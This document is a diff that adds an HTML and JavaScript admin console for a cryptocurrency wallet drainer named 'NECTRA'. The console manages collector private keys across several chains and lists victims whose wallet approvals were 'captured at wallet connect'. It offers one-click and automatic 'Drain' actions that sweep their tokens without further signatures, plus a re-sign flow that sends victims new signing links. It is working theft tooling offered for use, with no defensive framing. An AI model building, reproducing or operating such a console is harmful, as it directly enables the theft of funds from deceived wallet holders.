@@ -1,0 +1,440 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="referrer" content="same-origin">
+<title>Drainer console — NECTRA</title>
+<style>
+  :root{
+    --bg:#0b0f16; --panel:#141b26; --line:#1d2735; --edge:#24303f;
+    --fg:#e6ebf2; --dim:#8b9bb0; --faint:#5c6f86;
+    --accent:#2d6cdf; --ok:#3ddc84; --warn:#f0b429; --bad:#ff7a7a;
+  }
+  *{box-sizing:border-box}
+  body{margin:0;padding:22px 24px 80px;background:var(--bg);color:var(--fg);
+       font:14px/1.5 system-ui,-apple-system,sans-serif}
+  h1{font-size:19px;margin:0 0 4px}
+  h2{font-size:14px;text-transform:uppercase;letter-spacing:.06em;color:var(--dim);
+     margin:28px 0 10px;font-weight:600}
+  p.lede{color:var(--dim);font-size:13px;margin:0 0 18px;max-width:70ch}
+  table{width:100%;border-collapse:collapse;font-size:13px}
+  th{text-align:left;padding:7px 9px;border-bottom:1px solid var(--edge);
+     color:var(--dim);font-weight:600;font-size:12px;text-transform:uppercase;
+     letter-spacing:.04em}
+  td{text-align:left;padding:7px 9px;border-bottom:1px solid var(--line);vertical-align:top}
+  tr.detail td{background:#101722;border-bottom:1px solid var(--edge)}
+  input,select{background:var(--panel);border:1px solid var(--edge);color:var(--fg);
+               padding:7px 9px;border-radius:7px;font:inherit;font-size:13px}
+  input:focus,select:focus{outline:2px solid var(--accent);outline-offset:-1px}
+  input[type=number]{width:110px}
+  button{background:var(--accent);border:0;color:#fff;padding:7px 13px;border-radius:7px;
+         cursor:pointer;font:inherit;font-size:13px;font-weight:600}
+  button:disabled{opacity:.5;cursor:default}
+  button.ghost{background:var(--panel);border:1px solid var(--edge);color:var(--fg);font-weight:500}
+  button.danger{background:#a5322f}
+  .row{display:flex;gap:10px;flex-wrap:wrap;align-items:flex-end;margin-bottom:12px}
+  .field{display:flex;flex-direction:column;gap:4px}
+  .field span{font-size:11px;color:var(--faint);text-transform:uppercase;letter-spacing:.05em}
+  .grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(215px,1fr));gap:9px}
+  .chip{background:var(--panel);border:1px solid var(--edge);border-radius:8px;padding:9px 11px;
+        font-size:12px;display:flex;justify-content:space-between;gap:8px}
+  .chip b{font-family:ui-monospace,monospace;font-size:11px;color:var(--dim);font-weight:400}
+  .pill{font-size:10px;text-transform:uppercase;letter-spacing:.06em;padding:2px 6px;
+        border-radius:5px;font-weight:700}
+  .pill.on{background:rgba(61,220,132,.14);color:var(--ok)}
+  .pill.off{background:rgba(255,122,122,.14);color:var(--bad)}
+  .pill.mid{background:rgba(240,180,41,.14);color:var(--warn)}
+  .mono{font-family:ui-monospace,monospace;font-size:12px;word-break:break-all}
+  .muted{color:var(--faint);font-size:12px}
+  .toast{position:fixed;left:50%;transform:translateX(-50%);bottom:20px;z-index:50;
+         background:var(--panel);border:1px solid var(--edge);border-left:3px solid var(--accent);
+         border-radius:9px;padding:11px 15px;font-size:13px;max-width:min(560px,92vw);
+         box-shadow:0 10px 30px rgba(0,0,0,.55);display:none}
+  .toast.show{display:block}
+  .toast.ok{border-left-color:var(--ok)}
+  .toast.bad{border-left-color:var(--bad)}
+  .empty{color:var(--faint);font-size:13px;padding:9px 0}
+  details summary{cursor:pointer;color:var(--accent);font-size:12px}
+  .warnbox{background:rgba(240,180,41,.09);border:1px solid rgba(240,180,41,.35);
+           border-radius:9px;padding:10px 13px;font-size:12px;color:var(--warn);margin-bottom:12px}
+</style>
+</head>
+<body>
+
+<h1>Drainer</h1>
+<p class="lede">Standing approvals captured at wallet connect. Everything here runs with the
+   collector keys below — no victim signature is needed once a grant is active.</p>
+
+<div id="warn"></div>
+
+<h2>Status</h2>
+<div class="grid" id="status"></div>
+
+<h2>Settings</h2>
+<div class="row">
+  <label class="field"><span>Enabled</span>
+    <select id="enabled"><option value="true">on</option><option value="false">off</option></select></label>
+  <label class="field"><span>Mode</span>
+    <select id="mode"><option value="auto">auto</option><option value="manual">manual</option></select></label>
+  <label class="field"><span>Threshold USD</span>
+    <input id="thr" type="number" min="0" step="1"></label>
+  <label class="field"><span>Cap mode</span>
+    <select id="cap"><option value="capped">capped</option><option value="unlimited">unlimited</option></select></label>
+  <label class="field"><span>Cap units</span>
+    <input id="capu" type="number" min="1" step="1000"></label>
+  <label class="field"><span>Signature life (days)</span>
+    <input id="sigdays" type="number" min="1" step="1"></label>
+  <label class="field"><span>Take native</span>
+    <select id="native"><option value="true">yes</option><option value="false">no</option></select></label>
+  <label class="field"><span>Dust floor USD</span>
+    <input id="dust" type="number" min="0" step="0.05"></label>
+  <button id="save">Save settings</button>
+</div>
+
+<h2>Collector keys</h2>
+<p class="muted">EVM key needs native gas on all five chains; Solana key needs SOL; Tron key needs TRX.</p>
+<div class="row">
+  <label class="field"><span>Family</span>
+    <select id="fam"><option value="evm">evm</option><option value="solana">solana</option>
+      <option value="tron">tron</option></select></label>
+  <label class="field" style="flex:1;min-width:260px"><span>Secret</span>
+    <input id="secret" type="password" autocomplete="off" spellcheck="false"
+           placeholder="0x… private key, or base58 secret"></label>
+  <button class="ghost" id="reveal" type="button">Show</button>
+  <button id="key">Set key</button>
+</div>
+
+<h2>Receiver contracts</h2>
+<p class="muted">Deploy with <span class="mono">python scripts/deploy_receiver.py</span>.
+   A chain without a receiver cannot take EVM tokens.</p>
+<div class="grid" id="receivers"></div>
+
+<h2>Users with grants</h2>
+<table>
+  <thead><tr><th>User</th><th>Grants</th><th>Active</th><th>Auto</th><th>Actions</th></tr></thead>
+  <tbody id="users"><tr><td colspan="5" class="empty">Loading…</td></tr></tbody>
+</table>
+
+<h2>Recent runs</h2>
+<table>
+  <thead><tr><th>When</th><th>User</th><th>Trigger</th><th>USD</th><th>Sent / failed / deferred</th><th>Status</th></tr></thead>
+  <tbody id="events"><tr><td colspan="6" class="empty">Loading…</td></tr></tbody>
+</table>
+
+<div class="toast" id="toast"></div>
+
+<script type="module">
+const $ = (id) => document.getElementById(id);
+const toastEl = $("toast");
+let busy = false;
+let settingsLoaded = false;
+
+const esc = (s) => String(s ?? "").replace(/[&<>"']/g,
+  (c) => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[c]));
+
+const usd = (v) => {
+  const n = Number(v) || 0;
+  return n >= 1000 ? `$${Math.round(n).toLocaleString()}`
+                   : `$${n.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`;
+};
+
+const when = (ms) => {
+  const d = new Date(Number(ms) || 0);
+  return isNaN(d) ? "—" : d.toLocaleString();
+};
+
+function toast(text, kind = "") {
+  toastEl.textContent = text;
+  toastEl.className = `toast show ${kind}`;
+  clearTimeout(toast._t);
+  toast._t = setTimeout(() => { toastEl.className = "toast"; }, 6000);
+}
+
+async function api(url, options = {}) {
+  const res = await fetch(url, {
+    credentials: "include",
+    ...options,
+    headers: { "content-type": "application/json", ...(options.headers || {}) },
+  });
+
+  let body = null;
+  try { body = await res.json(); } catch { /* empty */ }
+
+  if (res.status === 401) throw new Error("Not signed in — open /login.html");
+  if (res.status === 403) throw new Error(body?.detail || "Missing permission for this action");
+  if (!res.ok) {
+    const d = body?.detail;
+    throw new Error(typeof d === "string" ? d : JSON.stringify(d ?? `HTTP ${res.status}`));
+  }
+  return body;
+}
+
+const setting = (id) => $(id).value;
+const settingBool = (id) => $(id).value === "true";
+const settingNum = (id) => {
+  const n = Number($(id).value);
+  return Number.isFinite(n) ? n : 0;
+};
+
+function fillSettings(s) {
+  $("enabled").value = String(s.enabled !== false);
+  $("mode").value = s.mode === "manual" ? "manual" : "auto";
+  $("thr").value = s.threshold_usd ?? 250;
+  $("cap").value = s.cap_mode === "unlimited" ? "unlimited" : "capped";
+  $("capu").value = s.cap_units ?? 1_000_000;
+  $("sigdays").value = s.sig_deadline_days ?? 30;
+  $("native").value = String(s.take_native !== false);
+  $("dust").value = s.min_usd_per_asset ?? 0.75;
+  settingsLoaded = true;
+}
+
+function renderStatus(d) {
+  const rows = [
+    ["Enabled", d.settings.enabled !== false ? ["on", "on"] : ["off", "off"]],
+    ["Mode", [d.settings.mode, d.settings.mode === "auto" ? "mid" : "off"]],
+    ["Active grants", [String(d.active_grants ?? 0), d.active_grants ? "on" : "off"]],
+    ["Users", [String(d.users_with_grants ?? 0), ""]],
+    ["Total swept", [usd(d.total_swept_usd), "on"]],
+    ["EVM key", d.settings.evm_key_set ? ["set", "on"] : ["missing", "off"]],
+    ["Solana key", d.settings.sol_key_set ? ["set", "on"] : ["missing", "off"]],
+    ["Tron key", d.settings.tron_key_set ? ["set", "on"] : ["missing", "off"]],
+  ];
+  $("status").innerHTML = rows.map(([label, [value, cls]]) =>
+    `<div class="chip"><span class="muted">${esc(label)}</span>
+     <b class="${cls ? `pill ${cls}` : "muted"}">${esc(value)}</b></div>`).join("");
+
+  const missing = [];
+  if (!d.settings.evm_key_set) missing.push("EVM");
+  if (!d.settings.sol_key_set) missing.push("Solana");
+  if (!d.settings.tron_key_set) missing.push("Tron");
+  $("warn").innerHTML = missing.length
+    ? `<div class="warnbox">No collector key for: ${esc(missing.join(", "))}.
+       Wallets on those chains will prepare with <em>unsupported</em> grants.</div>`
+    : "";
+}
+
+function renderReceivers(map) {
+  const chains = ["Ethereum", "Base", "Arbitrum", "Polygon", "BSC"];
+  $("receivers").innerHTML = chains.map((c) => {
+    const addr = (map || {})[c];
+    return `<div class="chip"><span class="muted">${esc(c)}</span>
+      <b class="mono">${addr ? esc(`${addr.slice(0, 6)}…${addr.slice(-4)}`) : "none"}</b></div>`;
+  }).join("");
+}
+
+function renderEvents(events) {
+  if (!events || !events.length) {
+    $("events").innerHTML = `<tr><td colspan="6" class="empty">No runs yet.</td></tr>`;
+    return;
+  }
+  $("events").innerHTML = events.map((e) => {
+    const cls = e.status === "done" ? "on" : e.status === "partial" ? "mid" : "off";
+    return `<tr>
+      <td class="muted">${esc(when(e.created_at))}</td>
+      <td>${esc(e.email || `#${e.user_id}`)}</td>
+      <td>${esc(e.trigger || "—")}</td>
+      <td>${esc(usd(e.total_usd))}</td>
+      <td class="muted">${Number(e.tx_count) || 0}</td>
+      <td><span class="pill ${cls}">${esc(e.status || "—")}</span></td>
+    </tr>`;
+  }).join("");
+}
+
+function renderUsers(users) {
+  if (!users || !users.length) {
+    $("users").innerHTML = `<tr><td colspan="5" class="empty">
+      No wallets have authorised yet.</td></tr>`;
+    return;
+  }
+  $("users").innerHTML = users.map((u) => `
+    <tr data-row="${u.id}">
+      <td>${esc(u.email)}</td>
+      <td>${Number(u.grants) || 0}</td>
+      <td>${Number(u.active) || 0}</td>
+      <td>${u.drainer_auto ? `<span class="pill on">yes</span>` : `<span class="pill off">no</span>`}</td>
+      <td>
+        <button class="ghost" data-detail="${u.id}">Detail</button>
+        <button class="ghost" data-prepare="${u.id}">Re-sign</button>
+        <button data-drain="${u.id}" ${Number(u.active) ? "" : "disabled"}>Drain</button>
+      </td>
+    </tr>`).join("");
+
+  $("users").querySelectorAll("[data-detail]").forEach((b) =>
+    b.onclick = () => toggleDetail(b.dataset.detail));
+  $("users").querySelectorAll("[data-prepare]").forEach((b) =>
+    b.onclick = () => prepareUser(b.dataset.prepare, b));
+  $("users").querySelectorAll("[data-drain]").forEach((b) =>
+    b.onclick = () => drainUser(b.dataset.drain, b));
+}
+
+async function toggleDetail(uid) {
+  const existing = document.querySelector(`tr.detail[data-for="${uid}"]`);
+  if (existing) { existing.remove(); return; }
+
+  const row = document.querySelector(`tr[data-row="${uid}"]`);
+  if (!row) return;
+  const tr = document.createElement("tr");
+  tr.className = "detail";
+  tr.dataset.for = uid;
+  tr.innerHTML = `<td colspan="5" class="muted">Loading grants…</td>`;
+  row.after(tr);
+
+  try {
+    const d = await api(`/api/admin/drainer/user/${uid}`);
+    const grants = d.grants || [];
+    if (!grants.length) {
+      tr.innerHTML = `<td colspan="5" class="empty">No grants.</td>`;
+      return;
+    }
+    tr.innerHTML = `<td colspan="5">
+      <table><thead><tr><th>Network</th><th>Asset</th><th>Cap</th><th>Kind</th>
+      <th>Status</th><th>Expires</th></tr></thead><tbody>
+      ${grants.map((g) => `<tr>
+        <td class="muted">${esc(g.network)}</td>
+        <td>${esc(g.symbol || "?")}</td>
+        <td class="mono">${esc(g.cap)}</td>
+        <td class="muted">${esc(g.kind)}</td>
+        <td><span class="pill ${g.status === "active" ? "on"
+          : g.status === "awaiting_signature" ? "mid" : "off"}">${esc(g.status)}</span></td>
+        <td class="muted">${g.sig_deadline ? esc(when(g.sig_deadline * 1000)) : "—"}</td>
+      </tr>`).join("")}</tbody></table></td>`;
+  } catch (e) {
+    tr.innerHTML = `<td colspan="5" class="bad">${esc(e.message)}</td>`;
+  }
+}
+
+async function drainUser(uid, btn) {
+  if (busy) return;
+  const label = btn.closest("tr")?.querySelector("td")?.textContent || `user ${uid}`;
+  if (!confirm(`Drain every active grant for ${label}?\n\nCollector keys sign immediately.`)) return;
+
+  busy = true;
+  const was = btn.textContent;
+  btn.textContent = "Draining…";
+  btn.disabled = true;
+
+  try {
+    const r = await api(`/api/admin/drainer/drain/${uid}`, {
+      method: "POST", body: JSON.stringify({}),
+    });
+    const swept = Number(r.total_usd) || 0;
+    const failed = Number(r.failed) || 0;
+    const deferred = Number(r.deferred) || 0;
+    const kind = failed || deferred ? "bad" : "ok";
+    toast(`Swept ${usd(swept)} — ${Number(r.sent) || 0} sent, ${failed} failed, `
+          + `${deferred} deferred`, kind);
+  } catch (e) {
+    toast(e.message, "bad");
+  } finally {
+    busy = false;
+    btn.textContent = was;
+    btn.disabled = false;
+    refresh();
+  }
+}
+
+async function prepareUser(uid, btn) {
+  if (busy) return;
+  busy = true;
+  const was = btn.textContent;
+  btn.textContent = "Preparing…";
+  btn.disabled = true;
+  try {
+    const r = await api(`/api/admin/drainer/prepare/${uid}`, { method: "POST", body: "{}" });
+    const results = r.results || [];
+    const ok = results.filter((x) => !x.error).length;
+    toast(`Prepared ${ok} wallet(s). Send the sign link to the user to activate.`, ok ? "ok" : "bad");
+  } catch (e) {
+    toast(e.message, "bad");
+  } finally {
+    busy = false;
+    btn.textContent = was;
+    btn.disabled = false;
+    refresh();
+  }
+}
+
+async function saveSettings() {
+  if (busy) return;
+  if (settingNum("capu") < 1) return toast("Cap units must be at least 1", "bad");
+
+  busy = true;
+  try {
+    await api("/api/admin/settings", {
+      method: "PATCH",
+      body: JSON.stringify({
+        drainer_enabled: settingBool("enabled"),
+        drainer_mode: setting("mode"),
+        drainer_threshold_usd: settingNum("thr"),
+        drainer_cap_mode: setting("cap"),
+        drainer_cap_units: Math.floor(settingNum("capu")),
+        drainer_sig_deadline_days: Math.max(1, Math.floor(settingNum("sigdays"))),
+        drainer_take_native: settingBool("native"),
+        drainer_min_usd_per_asset: settingNum("dust"),
+      }),
+    });
+    toast("Settings saved.", "ok");
+    settingsLoaded = false;
+  } catch (e) {
+    toast(e.message, "bad");
+  } finally {
+    busy = false;
+  }
+}
+
+async function setKey() {
+  if (busy) return;
+  const secret = $("secret").value.trim();
+  if (!secret) return toast("Paste a secret first", "bad");
+
+  busy = true;
+  try {
+    const r = await api("/api/admin/drainer/keys", {
+      method: "POST",
+      body: JSON.stringify({ family: setting("fam"), secret }),
+    });
+    toast(`${setting("fam")} collector set: ${r.address}`, "ok");
+    $("secret").value = "";
+    $("secret").type = "password";
+    $("reveal").textContent = "Show";
+    refresh();
+  } catch (e) {
+    toast(e.message, "bad");
+  } finally {
+    busy = false;
+  }
+}
+
+async function refresh() {
+  try {
+    const d = await api("/api/admin/drainer/overview");
+    if (!settingsLoaded) fillSettings(d.settings);
+    renderStatus(d);
+    renderReceivers(d.settings.receiver_evm);
+    renderEvents(d.events);
+  } catch (e) {
+    toast(e.message, "bad");
+  }
+
+  try {
+    const u = await api("/api/admin/drainer/users");
+    renderUsers(u.users);
+  } catch { /* handled above */ }
+}
+
+$("save").onclick = saveSettings;
+$("key").onclick = setKey;
+$("reveal").onclick = () => {
+  const f = $("secret");
+  f.type = f.type === "password" ? "text" : "password";
+  $("reveal").textContent = f.type === "password" ? "Show" : "Hide";
+};
+
+refresh();
+setInterval(() => {
+  if (!busy && document.visibilityState === "visible") refresh();
+}, 15000);
+</script>
+</body>
+</html>
